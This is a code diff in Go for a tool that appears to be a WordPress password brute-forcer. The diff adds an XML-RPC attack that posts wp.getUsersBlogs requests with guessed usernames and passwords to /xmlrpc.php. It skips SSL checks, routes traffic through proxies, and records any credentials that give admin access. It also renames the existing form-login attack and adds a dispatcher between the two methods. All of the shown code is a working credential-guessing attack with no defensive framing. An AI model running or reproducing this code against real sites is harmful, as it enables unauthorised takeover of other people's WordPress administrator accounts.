@@ -39,12 +39,49 @@ func NewWpGo(attackType string) *WpGo {
 	w.http = *Ghttp.New()
 	return &w
 }
+func (w *WpGo) Login(site SiteTask) {
+	switch w.AttackType {
+	case "login":
+		w.FormLogin(site)
+	case "xmlrpc":
+		w.XMLRCPLogin(site)
+	default:
+		break
+	}
+
+}
 func (w *WpGo) XMLRCPLogin(siteTask SiteTask) {
 	if w.CheckIsBlack(siteTask) {
 		return
 	}
+	log.Println(siteTask)
+	uri := fmt.Sprintf("%s/xmlrpc.php", siteTask.Host)
+	postData := fmt.Sprintf(`<methodCall>
+	  <methodName>wp.getUsersBlogs</methodName>
+	  <params>
+		 <param><value>%s</value></param>
+		 <param><value>%s</value></param>
+	  </params>
+	</methodCall>`, siteTask.User, siteTask.Pass)
+	w.http.New("POST", uri)
+	w.http.IgnoreSSL()
+	w.http.SetPostString(postData)
+	if Proxy != "" {
+		w.http.SetProxy(Proxy)
+	}
+	if r := w.http.Execute(); r == nil {
+		return
+	}
+	ret, _ := w.http.Text()
+	if strings.Contains(ret, "isAdmin") {
+		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
+		w.SetSuccess(key)
+		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
+		log.Printf(line)
+		Write(line)
+	}
 }
-func (w *WpGo) Attack(siteTask SiteTask) {
+func (w *WpGo) FormLogin(siteTask SiteTask) {
 	if w.CheckIsBlack(siteTask) {
 		//log.Println("IsBlack ", siteTask)
 		return
@@ -67,12 +104,7 @@ func (w *WpGo) Attack(siteTask SiteTask) {
 	}
 	defer w.http.Close()
 	cookie := w.http.RespCookie()
-	//log.Println(cookie)
-	//log.Println(w.http.StatusCode())
-	//log.Println(w.http.HttpResponse.Header)
 	location := w.http.GetRespHead("location")
-	//log.Println(location)
-	//log.Println(r)
 	if strings.Contains(cookie, "wordpress_logged_in") && w.http.StatusCode() == 302 && strings.Contains(location, "wp-admin") {
 		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
 		w.SetSuccess(key)
